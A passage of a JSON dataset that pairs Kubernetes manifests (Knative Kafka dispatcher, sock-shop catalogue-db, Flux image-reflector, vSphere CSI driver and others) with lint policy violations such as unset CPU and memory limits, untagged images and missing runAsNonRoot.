    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200206-f88edefe8\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-reaper\" has cpu request 0"
  },
  {
    "id": "8941",
    "manifest_path": "data/manifests/the_stack_sample/sample_3378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200206-f88edefe8\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-reaper\" has memory limit 0"
  },
  {
    "id": "8942",
    "manifest_path": "data/manifests/the_stack_sample/sample_3379.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-sys-admin-capabilities\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hello\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8943",
    "manifest_path": "data/manifests/the_stack_sample/sample_3379.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-sys-admin-capabilities\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "8944",
    "manifest_path": "data/manifests/the_stack_sample/sample_3379.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-sys-admin-capabilities\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "8945",
    "manifest_path": "data/manifests/the_stack_sample/sample_3379.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-sys-admin-capabilities\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "8946",
    "manifest_path": "data/manifests/the_stack_sample/sample_3379.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-sys-admin-capabilities\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - echo 'Hello' && sleep 1h\n    image: busybox\n    name: hello\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "8947",
    "manifest_path": "data/manifests/the_stack_sample/sample_3381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kafka-broker-dispatcher\n  namespace: knative-eventing\n  labels:\n    app: kafka-broker-dispatcher\n    kafka.eventing.knative.dev/release: devel\nspec:\n  selector:\n    matchLabels:\n      app: kafka-broker-dispatcher\n  template:\n    metadata:\n      name: kafka-broker-dispatcher\n      labels:\n        app: kafka-broker-dispatcher\n        kafka.eventing.knative.dev/release: devel\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65532\n      containers:\n      - name: kafka-broker-dispatcher\n        image: ${KNATIVE_KAFKA_BROKER_DISPATCHER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-kafka-broker-data-plane\n          readOnly: true\n        - mountPath: /etc/brokers-triggers\n          name: kafka-broker-brokers-triggers\n          readOnly: true\n        - mountPath: /tmp\n          name: cache\n        - mountPath: /etc/logging\n          name: kafka-broker-config-logging\n          readOnly: true\n        - mountPath: /etc/tracing\n          name: config-tracing\n          readOnly: true\n        ports:\n        - containerPort: 9090\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: SERVICE_NAME\n          value: kafka-broker-dispatcher\n        - name: SERVICE_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: PRODUCER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-producer.properties\n        - name: CONSUMER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-consumer.properties\n        - name: WEBCLIENT_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-webclient.properties\n        - name: DATA_PLANE_CONFIG_FILE_PATH\n          value: /etc/brokers-triggers/data\n        - name: EGRESSES_INITIAL_CAPACITY\n          value: '20'\n        - name: INSTANCE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: METRICS_PATH\n          value: /metrics\n        - name: METRICS_PORT\n          value: '9090'\n        - name: METRICS_PUBLISH_QUANTILES\n          value: 'false'\n        - name: METRICS_JVM_ENABLED\n          value: 'false'\n        - name: CONFIG_TRACING_PATH\n          value: /etc/tracing\n        command:\n        - java\n        args:\n        - -Dlogback.configurationFile=/etc/logging/config.xml\n        - -jar\n        - /app/app.jar\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: false\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config-kafka-broker-data-plane\n        configMap:\n          name: config-kafka-broker-data-plane\n      - name: kafka-broker-brokers-triggers\n        configMap:\n          name: kafka-broker-brokers-triggers\n      - name: cache\n        emptyDir: {}\n      - name: kafka-broker-config-logging\n        configMap:\n          name: kafka-config-logging\n      - name: config-tracing\n        configMap:\n          name: config-tracing\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kafka-broker-dispatcher\" is using an invalid container image, \"${KNATIVE_KAFKA_BROKER_DISPATCHER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8948",
    "manifest_path": "data/manifests/the_stack_sample/sample_3381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kafka-broker-dispatcher\n  namespace: knative-eventing\n  labels:\n    app: kafka-broker-dispatcher\n    kafka.eventing.knative.dev/release: devel\nspec:\n  selector:\n    matchLabels:\n      app: kafka-broker-dispatcher\n  template:\n    metadata:\n      name: kafka-broker-dispatcher\n      labels:\n        app: kafka-broker-dispatcher\n        kafka.eventing.knative.dev/release: devel\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65532\n      containers:\n      - name: kafka-broker-dispatcher\n        image: ${KNATIVE_KAFKA_BROKER_DISPATCHER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-kafka-broker-data-plane\n          readOnly: true\n        - mountPath: /etc/brokers-triggers\n          name: kafka-broker-brokers-triggers\n          readOnly: true\n        - mountPath: /tmp\n          name: cache\n        - mountPath: /etc/logging\n          name: kafka-broker-config-logging\n          readOnly: true\n        - mountPath: /etc/tracing\n          name: config-tracing\n          readOnly: true\n        ports:\n        - containerPort: 9090\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: SERVICE_NAME\n          value: kafka-broker-dispatcher\n        - name: SERVICE_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: PRODUCER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-producer.properties\n        - name: CONSUMER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-consumer.properties\n        - name: WEBCLIENT_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-webclient.properties\n        - name: DATA_PLANE_CONFIG_FILE_PATH\n          value: /etc/brokers-triggers/data\n        - name: EGRESSES_INITIAL_CAPACITY\n          value: '20'\n        - name: INSTANCE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: METRICS_PATH\n          value: /metrics\n        - name: METRICS_PORT\n          value: '9090'\n        - name: METRICS_PUBLISH_QUANTILES\n          value: 'false'\n        - name: METRICS_JVM_ENABLED\n          value: 'false'\n        - name: CONFIG_TRACING_PATH\n          value: /etc/tracing\n        command:\n        - java\n        args:\n        - -Dlogback.configurationFile=/etc/logging/config.xml\n        - -jar\n        - /app/app.jar\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: false\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config-kafka-broker-data-plane\n        configMap:\n          name: config-kafka-broker-data-plane\n      - name: kafka-broker-brokers-triggers\n        configMap:\n          name: kafka-broker-brokers-triggers\n      - name: cache\n        emptyDir: {}\n      - name: kafka-broker-config-logging\n        configMap:\n          name: kafka-config-logging\n      - name: config-tracing\n        configMap:\n          name: config-tracing\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kafka-broker-dispatcher\" has cpu request 0"
  },
  {
    "id": "8949",
    "manifest_path": "data/manifests/the_stack_sample/sample_3381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kafka-broker-dispatcher\n  namespace: knative-eventing\n  labels:\n    app: kafka-broker-dispatcher\n    kafka.eventing.knative.dev/release: devel\nspec:\n  selector:\n    matchLabels:\n      app: kafka-broker-dispatcher\n  template:\n    metadata:\n      name: kafka-broker-dispatcher\n      labels:\n        app: kafka-broker-dispatcher\n        kafka.eventing.knative.dev/release: devel\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65532\n      containers:\n      - name: kafka-broker-dispatcher\n        image: ${KNATIVE_KAFKA_BROKER_DISPATCHER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-kafka-broker-data-plane\n          readOnly: true\n        - mountPath: /etc/brokers-triggers\n          name: kafka-broker-brokers-triggers\n          readOnly: true\n        - mountPath: /tmp\n          name: cache\n        - mountPath: /etc/logging\n          name: kafka-broker-config-logging\n          readOnly: true\n        - mountPath: /etc/tracing\n          name: config-tracing\n          readOnly: true\n        ports:\n        - containerPort: 9090\n          name: http-metrics\n          protocol: TCP\n        env:\n        - name: SERVICE_NAME\n          value: kafka-broker-dispatcher\n        - name: SERVICE_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: PRODUCER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-producer.properties\n        - name: CONSUMER_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-consumer.properties\n        - name: WEBCLIENT_CONFIG_FILE_PATH\n          value: /etc/config/config-kafka-broker-webclient.properties\n        - name: DATA_PLANE_CONFIG_FILE_PATH\n          value: /etc/brokers-triggers/data\n        - name: EGRESSES_INITIAL_CAPACITY\n          value: '20'\n        - name: INSTANCE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: METRICS_PATH\n          value: /metrics\n        - name: METRICS_PORT\n          value: '9090'\n        - name: METRICS_PUBLISH_QUANTILES\n          value: 'false'\n        - name: METRICS_JVM_ENABLED\n          value: 'false'\n        - name: CONFIG_TRACING_PATH\n          value: /etc/tracing\n        command:\n        - java\n        args:\n        - -Dlogback.configurationFile=/etc/logging/config.xml\n        - -jar\n        - /app/app.jar\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            port: 9090\n            path: /metrics\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 3\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: false\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config-kafka-broker-data-plane\n        configMap:\n          name: config-kafka-broker-data-plane\n      - name: kafka-broker-brokers-triggers\n        configMap:\n          name: kafka-broker-brokers-triggers\n      - name: cache\n        emptyDir: {}\n      - name: kafka-broker-config-logging\n        configMap:\n          name: kafka-config-logging\n      - name: config-tracing\n        configMap:\n          name: config-tracing\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kafka-broker-dispatcher\" has memory limit 0"
  },
  {
    "id": "8950",
    "manifest_path": "data/manifests/the_stack_sample/sample_3382.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: blackbox-exporter\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 0.18.0\n  name: blackbox-exporter-headless\n  namespace: monitoring\nspec:\n  clusterIP: None\n  ports:\n  - name: probe\n    port: 19115\n    targetPort: http\n  selector:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: blackbox-exporter\n    app.kubernetes.io/part-of: kube-prometheus\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:exporter app.kubernetes.io/name:blackbox-exporter app.kubernetes.io/part-of:kube-prometheus])"
  },
  {
    "id": "8951",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sampleapp\" is using an invalid container image, \"chittureg.azurecr.io/azure-pipelines-canary-k8s\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8952",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8953",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sampleapp\" does not have a read-only root file system"
  },
  {
    "id": "8954",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sampleapp\" is not set to runAsNonRoot"
  },
  {
    "id": "8955",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sampleapp\" has cpu request 0"
  },
  {
    "id": "8956",
    "manifest_path": "data/manifests/the_stack_sample/sample_3383.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\n  labels:\n    app: sampleapp\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: chittureg.azurecr.io/azure-pipelines-canary-k8s\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8000\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sampleapp\" has memory limit 0"
  },
  {
    "id": "8957",
    "manifest_path": "data/manifests/the_stack_sample/sample_3384.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\n  namespace: sock-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: catalogue-db\n  template:\n    metadata:\n      labels:\n        name: catalogue-db\n    spec:\n      containers:\n      - name: catalogue-db\n        image: weaveworksdemos/catalogue-db:0.3.0\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: fake_password\n        - name: MYSQL_DATABASE\n          value: socksdb\n        ports:\n        - name: mysql\n          containerPort: 3306\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"catalogue-db\" does not have a read-only root file system"
  },
  {
    "id": "8958",
    "manifest_path": "data/manifests/the_stack_sample/sample_3384.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\n  namespace: sock-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: catalogue-db\n  template:\n    metadata:\n      labels:\n        name: catalogue-db\n    spec:\n      containers:\n      - name: catalogue-db\n        image: weaveworksdemos/catalogue-db:0.3.0\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: fake_password\n        - name: MYSQL_DATABASE\n          value: socksdb\n        ports:\n        - name: mysql\n          containerPort: 3306\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"catalogue-db\" is not set to runAsNonRoot"
  },
  {
    "id": "8959",
    "manifest_path": "data/manifests/the_stack_sample/sample_3384.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\n  namespace: sock-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: catalogue-db\n  template:\n    metadata:\n      labels:\n        name: catalogue-db\n    spec:\n      containers:\n      - name: catalogue-db\n        image: weaveworksdemos/catalogue-db:0.3.0\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: fake_password\n        - name: MYSQL_DATABASE\n          value: socksdb\n        ports:\n        - name: mysql\n          containerPort: 3306\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"catalogue-db\" has cpu request 0"
  },
  {
    "id": "8960",
    "manifest_path": "data/manifests/the_stack_sample/sample_3384.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\n  namespace: sock-shop\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: catalogue-db\n  template:\n    metadata:\n      labels:\n        name: catalogue-db\n    spec:\n      containers:\n      - name: catalogue-db\n        image: weaveworksdemos/catalogue-db:0.3.0\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: fake_password\n        - name: MYSQL_DATABASE\n          value: socksdb\n        ports:\n        - name: mysql\n          containerPort: 3306\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"catalogue-db\" has memory limit 0"
  },
  {
    "id": "8961",
    "manifest_path": "data/manifests/the_stack_sample/sample_3388.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: flux-system\n    control-plane: controller\n  name: image-reflector-controller\n  namespace: flux-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: image-reflector-controller\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '8080'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: image-reflector-controller\n    spec:\n      containers:\n      - args:\n        - --events-addr=http://notification-controller/\n        - --watch-all-namespaces\n        - --log-level=info\n        - --log-encoding=json\n        - --enable-leader-election\n        env:\n        - name: RUNTIME_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: fluxcd/image-reflector-controller:v0.7.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n        name: manager\n        ports:\n        - containerPort: 8080\n          name: http-prom\n        - containerPort: 9440\n          name: healthz\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: healthz\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1Gi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp\n        - mountPath: /data\n          name: data\n      securityContext:\n        fsGroup: 1337\n      serviceAccountName: image-reflector-controller\n      volumes:\n      - emptyDir: {}\n        name: temp\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"image-reflector-controller\" not found"
  },
  {
    "id": "8962",
    "manifest_path": "data/manifests/the_stack_sample/sample_3388.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: flux-system\n    control-plane: controller\n  name: image-reflector-controller\n  namespace: flux-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: image-reflector-controller\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '8080'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: image-reflector-controller\n    spec:\n      containers:\n      - args:\n        - --events-addr=http://notification-controller/\n        - --watch-all-namespaces\n        - --log-level=info\n        - --log-encoding=json\n        - --enable-leader-election\n        env:\n        - name: RUNTIME_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: fluxcd/image-reflector-controller:v0.7.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n        name: manager\n        ports:\n        - containerPort: 8080\n          name: http-prom\n        - containerPort: 9440\n          name: healthz\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: healthz\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1Gi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /tmp\n          name: temp\n        - mountPath: /data\n          name: data\n      securityContext:\n        fsGroup: 1337\n      serviceAccountName: image-reflector-controller\n      volumes:\n      - emptyDir: {}\n        name: temp\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"manager\" is not set to runAsNonRoot"
  },
  {
    "id": "8963",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n        